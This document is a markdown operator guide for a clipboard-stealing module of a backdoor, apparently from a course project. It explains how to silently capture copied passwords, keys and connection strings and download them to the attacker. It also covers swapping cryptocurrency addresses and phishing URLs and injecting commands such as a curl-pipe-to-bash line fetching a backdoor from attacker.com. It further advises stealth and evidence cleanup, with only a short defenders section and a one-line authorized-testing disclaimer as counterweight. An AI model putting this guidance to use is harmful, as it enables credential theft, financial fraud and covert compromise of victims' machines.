# Clipboard Stealer Implementation Guide

## Overview

The clipboard stealer monitors and captures all text copied to the target's clipboard, providing real-time theft of passwords, credentials, and sensitive data.

## Implementation Details

### Architecture

- **Module**: `features/clipboard_stealer.py`
- **Classes**:
  - `ClipboardStealer` - Full-featured using pyperclip
  - `FallbackClipboardStealer` - Fallback when pyperclip unavailable
- **Log Directory**: `logs/clipboard/`
- **Log Files**: `clipboard_YYYYMMDD_HHMMSS.txt`

### How It Works

1. **Background Monitoring**: Daemon thread checks clipboard every 1 second
2. **Change Detection**: Compares current clipboard with last known content
3. **Automatic Logging**: When clipboard changes, logs timestamp + full content
4. **Non-blocking**: Runs independently without affecting backdoor operations

### Monitoring Loop

```
Initialize → Get initial clipboard
↓
While running:
  ├─ Get current clipboard
  ├─ Compare with last content
  ├─ If changed and not empty:
  │  ├─ Log with timestamp
  │  └─ Update last content
  └─ Sleep 1 second
```

## Commands Reference

### Start Monitoring

```bash
clipboard_start
```

**What happens:**

- Creates new log file with timestamp
- Starts background monitoring thread
- Begins checking clipboard every second
- Returns log file path

**Response:**

```
[+] Clipboard monitoring started. Logging to: logs/clipboard/clipboard_20251004_150230.txt
```

**Use case:**

- Start before user begins work
- Capture passwords from password managers
- Monitor document editing sessions
- Steal credentials as they're copied

---

### Stop Monitoring

```bash
clipboard_stop
```

**What happens:**

- Stops the monitoring thread
- Saves final state to log
- Returns confirmation

**Response:**

```
[+] Clipboard monitoring stopped
```

**Use case:**

- End monitoring session
- Reduce detection risk
- Before downloading logs

---

### Get Status

```bash
clipboard_status
```

**What happens:**

- Queries current monitoring state
- Returns JSON with detailed information

**Response:**

```json
{
  "running": true,
  "log_file": "logs/clipboard/clipboard_20251004_150230.txt",
  "check_interval": 1,
  "pyperclip_available": true,
  "last_content_length": 256,
  "log_size_bytes": 2048
}
```

**Fields explained:**

- `running`: Is monitoring active?
- `log_file`: Current log file path
- `check_interval`: Seconds between checks (default: 1)
- `pyperclip_available`: Is library available?
- `last_content_length`: Length of last captured content
- `log_size_bytes`: Size of log file

---

### Get Current Clipboard

```bash
clipboard_get
```

**What happens:**

- Retrieves current clipboard content
- Does NOT start monitoring
- Does NOT log the content

**Response:**

```
[+] Latest clipboard content (42 chars):
This is some sensitive text from clipboard
```

**Use case:**

- Quick clipboard check
- Verify what user just copied
- Test clipboard access
- One-time retrieval without logging

---

### Set Clipboard (Injection)

```bash
clipboard_set <text>
```

**What happens:**

- Sets target's clipboard to your text
- User will paste YOUR content next
- Perfect for phishing and injection attacks

**Example:**

```bash
clipboard_set https://fake-bank-login.com
```

**Response:**

```
[+] Clipboard set to: https://fake-bank-login.com
```

**Attack scenarios:**

- Replace legitimate URLs with phishing links
- Inject malicious commands
- Replace cryptocurrency addresses
- Social engineering attacks

**Real examples:**

```bash
# Replace bank URL
clipboard_set https://fake-bank.com/steal-credentials

# Inject malicious command
clipboard_set curl http://attacker.com/malware.sh | bash

# Replace crypto address
clipboard_set 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa

# Inject SQL injection payload
clipboard_set ' OR '1'='1
```

---

### Dump Logs (Auto-Download)

```bash
clipboard_dump
```

**What happens:**

1. Locates current clipboard log file
2. Checks if file exists and has content
3. Automatically transfers to attacker machine
4. Saves as `clipboard_dump_YYYYMMDD_HHMMSS.txt`
5. Displays content in terminal

**Response:**

```
Clipboard log file ready: logs/clipboard/clipboard_20251004_150230.txt
[*] Downloading clipboard log file...
[+] Clipboard log file downloaded: clipboard_dump_20251004_150530.txt

=== Clipboard Log Content ===
============================================================
Timestamp: 2024-10-04 15:03:45
Length: 42 characters
------------------------------------------------------------
admin@company.com
============================================================

============================================================
Timestamp: 2024-10-04 15:04:12
Length: 23 characters
------------------------------------------------------------
MySecretPassword123!
============================================================
=== End of Clipboard Log ===
```

**File location:**

- Target: `logs/clipboard/clipboard_20251004_150230.txt`
- Attacker: `clipboard_dump_20251004_150530.txt` (current directory)

---

### Clear Logs

```bash
clipboard_clear
```

**What happens:**

- Deletes current log file
- Creates new empty log file
- Resets monitoring state
- Returns new log file path

**Response:**

```
[+] Clipboard logs cleared. New log file: logs/clipboard/clipboard_20251004_151045.txt
```

**Use case:**

- Remove old data before new session
- Clean up evidence
- Start fresh capture

---

### List Log Files

```bash
clipboard_list
```

**What happens:**

- Lists all clipboard log files
- Shows file sizes
- Sorted by name (timestamp)

**Response:**

```
[+] Clipboard log files:
  - clipboard_20251004_150230.txt (2048 bytes)
  - clipboard_20251004_145612.txt (1024 bytes)
  - clipboard_20251004_143305.txt (512 bytes)
```

**Use case:**

- See all captured sessions
- Choose which log to download
- Check log file sizes

## Log File Format

### Structure

```
============================================================
Timestamp: YYYY-MM-DD HH:MM:SS
Length: N characters
------------------------------------------------------------
[clipboard content here - preserves all formatting]
============================================================
```

### Example

```
============================================================
Timestamp: 2024-10-04 15:03:45
Length: 256 characters
------------------------------------------------------------
Database Connection:
Server: production-db.company.local
Username: db_admin
Password: Str0ngP@ssw0rd2024
Port: 5432
Database: production_data
============================================================

============================================================
Timestamp: 2024-10-04 15:05:30
Length: 2048 characters
------------------------------------------------------------
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2X9...
[SSH private key content]
-----END RSA PRIVATE KEY-----
============================================================
```

## Troubleshooting

### Issue 1: "Clipboard monitoring requires pyperclip"

**Cause:** pyperclip library not installed

**Solution:**

```bash
pip3 install pyperclip
```

**On target machine:**

```bash
cd /tmp/DES484_Backdoor
pip3 install pyperclip
```

---

### Issue 2: "Pyperclip could not find a copy/paste mechanism" (Linux)

**Cause:** xclip or xsel not installed

**Solution:**

```bash
# Ubuntu/Debian
sudo apt-get install xclip

# Fedora/CentOS
sudo dnf install xclip

# Arch Linux
sudo pacman -S xclip

# Alternative: xsel
sudo apt-get install xsel
```

**Verify:**

```bash
which xclip  # Should show path
python3 -c "import pyperclip; pyperclip.copy('test'); print(pyperclip.paste())"
```

---

### Issue 3: Clipboard monitoring starts but captures nothing

**Causes:**

1. User not copying anything
2. Only text content is captured (images ignored)
3. Monitoring check interval too high

**Solutions:**

```bash
# Check status
clipboard_status

# Test manually
clipboard_set "test content"
clipboard_get  # Should show "test content"

# If this works, monitoring will work when user copies text
```

---

### Issue 4: Downloaded log file is empty

**Causes:**

1. No clipboard activity occurred
2. Only images/files copied (not text)
3. Monitoring just started

**Solutions:**

```bash
# Check log size first
clipboard_status
# Look at "log_size_bytes"

# If 0 bytes:
# - No text has been copied yet
# - Wait for user activity

# If > 0 bytes:
clipboard_dump  # Should download content
```

---

### Issue 5: Clipboard changes not being logged

**Possible causes:**

1. Content is same as last copy (no change detected)
2. Content is empty/whitespace only
3. Monitoring stopped

**Debug:**

```bash
# Check if running
clipboard_status
# Look at "running": true/false

# If false:
clipboard_start

# Test with different content:
clipboard_set "content1"
# Wait 2 seconds
clipboard_set "content2"
# Check status to see last_content_length changed
```

---

### Issue 6: Permission errors on macOS

**Cause:** Python/Terminal not allowed clipboard access

**Solution:**

```
System Preferences > Security & Privacy > Privacy > Automation
Add Terminal or Python to allowed apps
```

---

### Issue 7: High CPU usage

**Cause:** Check interval too low or logging errors

**Solutions:**

- Default 1 second interval is optimal
- Check for errors in log file
- Stop and restart monitoring

## Limitations

### Technical Limitations

1. **Text Only**

   - Only captures text content
   - Images, files, and formatted content ignored
   - No metadata or source application info

2. **Timing**

   - Checks every 1 second (configurable)
   - May miss very rapid clipboard changes (< 1 sec apart)
   - Same content copied twice = not logged twice

3. **Platform Dependencies**

   - **Linux**: Requires xclip or xsel installed
   - **macOS**: Works natively
   - **Windows**: Works natively
   - Not all platforms supported equally

4. **Size Limitations**
   - Very large clipboard content (> 10MB) may slow down
   - Log files can grow very large
   - Memory limited by system

### Detection Risks

1. **Process Monitoring**

   - Background thread visible
   - Clipboard API calls can be monitored
   - Anti-malware may detect behavior

2. **File System**

   - Log files visible in logs/clipboard/
   - Directory created automatically
   - Files grow over time

3. **System Logs**
   - Clipboard access may be logged by OS
   - Security software may alert
   - Audit logs may show activity

### Functional Limitations

1. **No Context**

   - Doesn't know which app user copied from
   - No window title or application name
   - No source document information

2. **No History**

   - Only current clipboard monitored
   - No clipboard history access
   - Previous items not retrievable

3. **Single Clipboard**
   - Only monitors primary clipboard
   - Doesn't capture clipboard managers
   - No X11 selection buffer (Linux)

## Best Practices

### 1. Stealth Operation

```bash
# Start quietly
clipboard_start

# Don't check status frequently
# Let it accumulate data silently

# Single download at end
clipboard_dump

# Clean up
clipboard_clear
clipboard_stop
```

### 2. Data Collection

```bash
# Start before user session
clipboard_start

# Monitor during work hours
# Passwords often copied in morning

# Download periodically
clipboard_dump  # Every few hours

# Multiple timestamped files preserved
```

### 3. Attack Preparation

```bash
# Test clipboard access first
clipboard_get

# Start monitoring
clipboard_start

# Wait for target to copy credentials

# Download captured data
clipboard_dump

# Analyze offline
grep -i "password\|user\|login" clipboard_dump_*.txt
```

### 4. Injection Attacks

```bash
# Monitor first to understand user behavior
clipboard_start

# When user about to paste important data:
clipboard_set "malicious content"

# User pastes YOUR content instead
# Can be URL, command, data, etc.
```

## Attack Scenarios

### Scenario 1: Password Theft

```bash
# User opens password manager
# Copies password to login to service

# Your backdoor captures:
clipboard_start

# Download after user session:
clipboard_dump

# Result: All passwords user copied
```

**What gets captured:**

- Password manager passwords
- Database credentials
- Email passwords
- SSH passphrases
- API keys

---

### Scenario 2: Document Theft

```bash
# User works with confidential documents
# Copies sections for emails, reports, etc.

clipboard_start

# User copies:
# - Financial data
# - Trade secrets
# - Legal information
# - Personal data

clipboard_dump
# Result: Partial document content
```

---

### Scenario 3: Credential Harvesting

```bash
# User copies connection strings:
# "Server=prod;User=admin;Pass=secret"

clipboard_start

# Monitor during development work
# Captures:
# - Database connection strings
# - API endpoints with tokens
# - SSH connection details
# - VPN credentials

clipboard_dump
```

---

### Scenario 4: URL Injection (Phishing)

```bash
# User copies legitimate bank URL
clipboard_get
# Shows: https://secure-bank.com/login

# Replace with phishing URL
clipboard_set https://fake-bank-login.com/steal

# User pastes YOUR URL
# Thinks they're going to their bank
# Actually going to your phishing page
```

---

### Scenario 5: Command Injection

```bash
# User about to paste command in terminal

# Inject malicious command
clipboard_set "curl http://attacker.com/backdoor.sh | bash"

# User pastes and executes YOUR command
# Installs persistent backdoor
```

---

### Scenario 6: Crypto Address Swapping

```bash
# Monitor for crypto addresses
clipboard_start

# When detected:
clipboard_get
# Shows: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa (victim's address)

# Replace with your address
clipboard_set 1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2

# User sends payment to YOUR wallet instead
```

## Performance Optimization

### CPU Usage

- Idle between checks (1 second sleep)
- Minimal processing per check
- String comparison only
- No heavy operations

### Memory Usage

- Last content stored in memory (typically < 1MB)
- Log file on disk
- No buffer accumulation
- Automatic cleanup

### Disk Usage

- One log file per session
- Typical size: 1-10 KB per session
- Can grow to MB with heavy usage
- Old logs manually removed

## Security Considerations

### For Attackers

✅ Start monitoring early in session
✅ Download logs regularly
✅ Clear logs before disconnecting
✅ Use injection sparingly (detection risk)
✅ Don't check status too often

### For Defenders

✅ Monitor clipboard API access
✅ Use clipboard managers with encryption
✅ Clear clipboard after sensitive operations
✅ Check for logs/clipboard/ directory
✅ Monitor Python processes accessing clipboard
✅ Use security software

## Real-World Impact

### What Can Be Stolen

- 🔑 Passwords and passphrases
- 📧 Email credentials
- 💾 Database connection strings
- 🔐 SSH private keys
- 🌐 API keys and tokens
- 💰 Cryptocurrency addresses
- 📊 Financial data
- 📄 Confidential documents
- 💬 Private messages
- 🔗 Sensitive URLs

### Detection Methods

- Process monitoring tools
- Clipboard access logs
- Security software alerts
- High clipboard API usage
- Suspicious file creation

## Summary

The clipboard stealer is an advanced feature that:
✅ Monitors clipboard in real-time
✅ Captures all copied text
✅ Auto-downloads logs to attacker
✅ Supports injection attacks
✅ Works across platforms
✅ Minimal performance impact

**Use only in authorized testing environments.**
